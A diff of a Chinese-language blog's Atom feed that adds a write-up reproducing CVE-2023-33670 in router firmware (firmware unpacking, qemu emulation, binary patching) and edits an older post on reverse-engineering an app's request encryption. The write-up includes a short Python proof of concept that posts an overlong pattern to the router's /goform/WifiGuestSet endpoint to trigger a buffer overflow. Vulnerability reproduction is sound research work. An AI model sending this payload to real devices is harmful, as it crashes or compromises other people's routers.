@@ -6,14 +6,27 @@
   <icon>https://az0x01-blog.vercel.app/favicon.png</icon>
   <link href="https://az0x01-blog.vercel.app" />
   <link href="https://az0x01-blog.vercel.app/atom.xml" rel="self" type="application/atom+xml" />
-  <updated>2023-08-07T15:09:37.749Z</updated>
+  <updated>2023-09-18T17:47:04.914Z</updated>
   <author>
     <name><![CDATA[Az]]></name>
   </author>
+  <category term="PWN" scheme="https://az0x01-blog.vercel.app/?tags=PWN" />
   <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
   <category term="Android" scheme="https://az0x01-blog.vercel.app/?tags=Android" />
   <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
   <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
+  <entry>
+    <title type="html"><![CDATA[CVE-2023-33670 复现]]></title>
+    <link href="https://az0x01-blog.vercel.app/20230823" />
+    <id>https://az0x01-blog.vercel.app/20230823</id>
+    <published>2023-08-23T00:00:00.000Z</published>
+    <updated>2023-09-19T00:00:00.000Z</updated>
+    <summary type="html"><![CDATA[以及自己的第一个 CVE 编号]]></summary>
+    <content type="html">
+      <![CDATA[<h2 id="bin-文件的处理"><a href="#bin-文件的处理">bin 文件的处理</a></h2><p>使用 binwalk 对 bin 文件进行处理</p><p>安装 : <code>apt install binwalk</code></p><p>命令 : <code>binwalk -Me ./*.bin</code></p><p>解包后即为标准的 unix 文件系统</p><h2 id="qemu-环境搭建"><a href="#qemu-环境搭建">qemu 环境搭建</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>  apt-get install qemu-system</div><div class='line'>  apt-get install qemu-user-static</div></code></div></pre><!-- HTML_TAG_END --><p>以 <code>./bin/httpd</code> 为目标，使用<code>file</code>查看信息，LSB 选择 mipsel</p><p>进入到解包后的<strong>*bin/extracted/squashfs-root/</strong>目录下</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>  cp $(which qemu-mipsel-static) ./</div><div class='line'>  sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</div></code></div></pre><!-- HTML_TAG_END --><p>启动<strong>目标 httpd</strong>，由于存在检查，失败</p><h2 id="修补程序去掉-check"><a href="#修补程序去掉-check">修补程序，去掉 check</a></h2><p>Patch 前：</p><p><img src="./image-20230823195926271.png" alt="image-20230823195926271" class="rounded-lg my-2" loading="lazy" decoding="async"></p><p>使用 IDAPro 进行 Patch</p><p><img src="./image-20230823200528802.png" alt="image-20230823200528802" class="rounded-lg my-2" loading="lazy" decoding="async"></p><p>通过搜索<strong>Welcome</strong>关键字，找到程序中断点，</p><p>切换到图模式，可以确认在 <code>bgez</code> 处进行判断，只需要将原来的 <code>&gt;=</code> 修改即可，也就是将 <code>bgez</code> 改为 <code>bltz</code></p><p>在 <code>Edit -&gt; Patch program -&gt; Change byte</code>中 将<code>0A 00 41 04</code>改为<code>0A 00 01 04</code> 即可</p><p>Patch 后：</p><p><img src="./image-20230823195553164.png" alt="image-20230823195553164" class="rounded-lg my-2" loading="lazy" decoding="async"></p><h2 id="创建-bridge"><a href="#创建-bridge">创建 <code>bridge</code></a></h2><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>sudo brctl addbr br0</div><div class='line'>sudo brctl addif br0 eth0 &lt;- [eth0 from your interface on ifconfig]</div><div class='line'>sudo ifconfig br0 up</div><div class='line'>sudo dhclient br0</div></code></div></pre><!-- HTML_TAG_END --><p>如出现<code>Unsupported setsockopt level=65535 optname=128</code></p><p>执行 <code>cp -rf ./webroot_ro/* ./var/webroot/</code> 即可正常运行</p><h2 id="使用-poc-攻击"><a href="#使用-poc-攻击">使用 Poc 攻击</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'>import requests</div><div class='line'></div><div class='line'>host = "192.168.59.136:80"</div><div class='line'>cyclic = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaa"</div><div class='line'></div><div class='line'>def exploit_WifiGuestSet():</div><div class='line'>    url = f"http://&#123;host&#125;/goform/WifiGuestSet"</div><div class='line'>    data = &#123;</div><div class='line'>        b'shareSpeed':cyclic</div><div class='line'>    &#125;</div><div class='line'>    res = requests.post(url=url,data=data)</div><div class='line'>    print(res.content)</div><div class='line'></div><div class='line'>exploit_WifiGuestSet()</div></code></div></pre><!-- HTML_TAG_END --><h2 id="mips-编译测试"><a href="#mips-编译测试">MIPS 编译测试</a></h2><p>安装编译器</p><p><code>sudo apt-get install gcc-mips-linux-gnu</code></p><p>使用下面代码测试</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>#include &lt;stdio.h&gt;</div><div class='line'></div><div class='line'>int main(void) &#123;</div><div class='line'>    printf("hello&#92;n");</div><div class='line'>    return 0;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>编译</p><p><code>mips-linux-gnu-gcc -static hello.c -o hello</code></p><p>运行结果</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>$ cp /usr/bin/qemu-mips-static .</div><div class='line'>$ qemu-mips-static ./hello</div><div class='line'>hello</div></code></div></pre><!-- HTML_TAG_END --><h2 id="照猫画虎"><a href="#照猫画虎">照猫画虎</a></h2><blockquote><p>拿到了第一个 CVE 编号 <code>CVE-2023-42320</code></p></blockquote>]]>
+    </content>
+    <category term="PWN" scheme="https://az0x01-blog.vercel.app/?tags=PWN" />
+  </entry>
   <entry>
     <title type="html"><![CDATA[LVGL 初探]]></title>
     <link href="https://az0x01-blog.vercel.app/20230805" />
@@ -28,20 +41,20 @@
   </entry>
   <entry>
     <title type="html"><![CDATA[小天同学 第三方 APP 开发]]></title>
-    <link href="https://az0x01-blog.vercel.app/page4" />
-    <id>https://az0x01-blog.vercel.app/page4</id>
+    <link href="https://az0x01-blog.vercel.app/20230510" />
+    <id>https://az0x01-blog.vercel.app/20230510</id>
     <published>2023-05-10T00:00:00.000Z</published>
     <updated>2023-05-15T00:00:00.000Z</updated>
     <content type="html">
-      <![CDATA[<p>官方 APP 使用不便 想开发一个使用更加便捷的第三方 APP</p><h2 id="app-方向"><a href="#app-方向">APP 方向</a></h2><p>抓包 发现 <code>data</code> 有加密 尝试解密失败，试图寻找源码使用工具<a href="https://github.com/hluwa/frida-dexdump" rel="nofollow noopener noreferrer external" target="_blank">frida-dexdump</a> 脱壳，但得到的代码可读性很低，发现有小程序，于是转战</p><h2 id="微信小程序方向"><a href="#微信小程序方向">微信小程序方向</a></h2><blockquote><p>原以为小程序和微信服务器的沟通只是为了拿到手机号明文，于是想要直接使用小程序的请求方式完成登录等全部流程</p></blockquote><ul><li>使用工具 <a href="https://github.com/r3x5ur/unveilr" rel="nofollow noopener noreferrer external" target="_blank">unveilr</a> 直接对<code>__APP__.wxapkg</code>进行解包</li><li>使用<code>微信开发者工具</code>打开解包后的文件并尝试编译，成功 (好运)</li><li>尝试使用 Burpsuite 和 proxifier 对 PC 端小程序抓包，参考了<a href="https://blog.csdn.net/weixin_45031612/article/details/127416319" rel="nofollow noopener noreferrer external" target="_blank">相关教程</a>,寻找登录请求，发现和 APP 抓到的包有相同的加密</li><li>由于解包后的小程序代码有混淆，可读性差，于是直接调试</li><li>小程序的主要 JS 代码位于根目录下，由于其中的函数均声明了 <code>&quot;use strict&quot;</code> 所以先删除</li><li>搜索加密函数 直接使用<code>console.log</code>打印，在调试器里导出为全局变量 就可以进行加解密操作了</li><li>在某些情况下，会提示字符串不是 UTF-8，这时候需要将 <code>\\/</code> 改为 <code>\/</code> 可能还需要增减 <code>=</code> 的数量</li><li>到这里以为已经结束了，抓到的包可以直接解出，但是解密小程序的登录请求后发现里面还有一层加密且无法使用同样的解密方式解密</li><li>解密的微信小程序登录请求包中存在一个名为<code>code</code>的 key 通过查阅微信开发者文档，判断应该是与微信服务器的交流中拿到的，奈何微信的数据包加密十分抽象，没有思路拿到 <code>code</code> 于是思路再次中断</li></ul><h2 id="又回到最初的起点"><a href="#又回到最初的起点">又回到最初的起点🎵</a></h2><ul><li>偶然发现小程序的解密方式对 APP 抓到的包同样适用，于是柳暗花明，拿到验证码登录和打开饮水机的请求方式</li><li>现在只需要复现加解密函数即可，找到 <code>crypto-js</code> 库，发现完全一致，仅需的两个参数：密钥和密钥偏移量，也写在小程序的源码中</li></ul><blockquote><p>上面提到的<code>code</code>应该是微信服务端同时发送到小程序服务端和小程序客户端，一起发送给小程序服务端的还有被加密的手机号，小程序客户端需要用<code>code</code>才能拿到明文手机号</p></blockquote><h2 id="app-开发"><a href="#app-开发">APP 开发</a></h2><ul><li>在伪造请求时要注意发送数据的编码类型</li><li>在新版本中，如果要发送 http 请求，需要在 <code>AndroidManifest.xml</code> 的 <code>application</code> 中 增加 <code>android:usesCleartextTraffic=&quot;true&quot;</code></li><li>可能是由于编码方式的问题 返回的字符串有多余的 <code>\&quot;</code> 和 <code>\\</code> 字符</li><li>在 kotlin 中进行解密操作时，由于 <code>\\/</code> 字符的出现，需要使用三层`<code>对整体字符串进行包裹，使其转为 </code>raw` 后再进行替换操作</li><li>替换字符串时，kotlin 的正则貌似不大好用</li></ul>]]>
+      <![CDATA[<p>官方 APP 使用不便 于是想开发一个使用更便捷的第三方 APP <a href="https://github.com/aixiao0621/Duoheshui" rel="nofollow noopener noreferrer external" target="_blank">项目地址</a></p><h2 id="app-逆向"><a href="#app-逆向">APP 逆向</a></h2><p>抓包 发现 <code>data</code> 有加密 尝试解密失败，试图寻找源码使用工具<a href="https://github.com/hluwa/frida-dexdump" rel="nofollow noopener noreferrer external" target="_blank">frida-dexdump</a> 脱壳，但得到的代码可读性很低，发现有小程序，于是转战</p><h2 id="微信小程序-逆向"><a href="#微信小程序-逆向">微信小程序 逆向</a></h2><blockquote><p>原以为小程序和微信服务器的沟通只是为了拿到手机号明文，于是想要直接使用小程序的请求方式完成登录等全部流程</p></blockquote><ul><li>使用工具 <a href="https://github.com/r3x5ur/unveilr" rel="nofollow noopener noreferrer external" target="_blank">unveilr</a> 直接对<code>__APP__.wxapkg</code>进行解包</li><li>使用<code>微信开发者工具</code>打开解包后的文件并尝试编译，成功 (好运)</li><li>尝试使用 Burpsuite 和 proxifier 对 PC 端小程序抓包，参考了<a href="https://blog.csdn.net/weixin_45031612/article/details/127416319" rel="nofollow noopener noreferrer external" target="_blank">相关教程</a>,寻找登录请求，发现和 APP 抓到的包有相同的加密</li><li>由于解包后的小程序代码有混淆，可读性差，于是直接调试</li><li>小程序的主要 JS 代码位于根目录下，由于其中的函数均声明了 <code>&quot;use strict&quot;</code> 所以先删除</li><li>搜索加密函数 直接使用<code>console.log</code>打印，在调试器里导出为全局变量 就可以进行加解密操作了</li><li>在某些情况下，会提示字符串不是 UTF-8，这时候需要将 <code>\\/</code> 改为 <code>\/</code> 可能还需要增减 <code>=</code> 的数量</li><li>到这里以为已经结束了，抓到的包可以直接解出，但是解密小程序的登录请求后发现里面还有一层加密且无法使用同样的解密方式解密</li><li>解密的微信小程序登录请求包中存在一个名为<code>code</code>的 key 通过查阅微信开发者文档，判断应该是与微信服务器的交流中拿到的，奈何微信的数据包加密十分抽象，没有思路拿到 <code>code</code> 于是思路再次中断</li></ul><h2 id="又回到最初的起点"><a href="#又回到最初的起点">又回到最初的起点🎵</a></h2><ul><li>偶然发现小程序的解密方式对 APP 抓到的包同样适用，于是柳暗花明，拿到验证码登录和打开饮水机的请求方式</li><li>现在只需要复现加解密函数即可，找到 <code>crypto-js</code> 库，发现完全一致，仅需的两个参数：密钥和密钥偏移量，也写在小程序的源码中</li></ul><blockquote><p>上面提到的<code>code</code>应该是微信服务端同时发送到小程序服务端和小程序客户端，一起发送给小程序服务端的还有被加密的手机号，小程序客户端需要用<code>code</code>才能拿到明文手机号</p></blockquote><h2 id="app-开发"><a href="#app-开发">APP 开发</a></h2><ul><li>在伪造请求时要注意发送数据的编码类型</li><li>在新版本中，如果要发送 http 请求，需要在 <code>AndroidManifest.xml</code> 的 <code>application</code> 中 增加 <code>android:usesCleartextTraffic=&quot;true&quot;</code></li><li>可能是由于编码方式的问题 返回的字符串有多余的 <code>\&quot;</code> 和 <code>\\</code> 字符</li><li>在 kotlin 中进行解密操作时，由于 <code>\\/</code> 字符的出现，需要使用三层`<code>对整体字符串进行包裹，使其转为 </code>raw` 后再进行替换操作</li><li>替换字符串时，kotlin 的正则貌似不大好用</li></ul>]]>
     </content>
     <category term="Android" scheme="https://az0x01-blog.vercel.app/?tags=Android" />
     <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
   </entry>
   <entry>
     <title type="html"><![CDATA[使用 frida 对 APP 进行脱壳]]></title>
-    <link href="https://az0x01-blog.vercel.app/page2" />
-    <id>https://az0x01-blog.vercel.app/page2</id>
+    <link href="https://az0x01-blog.vercel.app/20230401" />
+    <id>https://az0x01-blog.vercel.app/20230401</id>
     <published>2023-04-01T00:00:00.000Z</published>
     <updated>2023-04-01T00:00:00.000Z</updated>
     <content type="html">
@@ -52,8 +65,8 @@
   </entry>
   <entry>
     <title type="html"><![CDATA[ 为 J1900 小主机刷写 openWRT]]></title>
-    <link href="https://az0x01-blog.vercel.app/page3" />
-    <id>https://az0x01-blog.vercel.app/page3</id>
+    <link href="https://az0x01-blog.vercel.app/20230305" />
+    <id>https://az0x01-blog.vercel.app/20230305</id>
     <published>2023-03-05T00:00:00.000Z</published>
     <updated>2023-03-18T00:00:00.000Z</updated>
     <summary type="html"><![CDATA[尽管并不稳定，但折腾就对了]]></summary>
@@ -64,8 +77,8 @@
   </entry>
   <entry>
     <title type="html"><![CDATA[通过 Homeassistant 控制继电器]]></title>
-    <link href="https://az0x01-blog.vercel.app/page1" />
-    <id>https://az0x01-blog.vercel.app/page1</id>
+    <link href="https://az0x01-blog.vercel.app/20230113" />
+    <id>https://az0x01-blog.vercel.app/20230113</id>
     <published>2023-01-13T00:00:00.000Z</published>
     <updated>2023-02-27T00:00:00.000Z</updated>
     <content type="html">
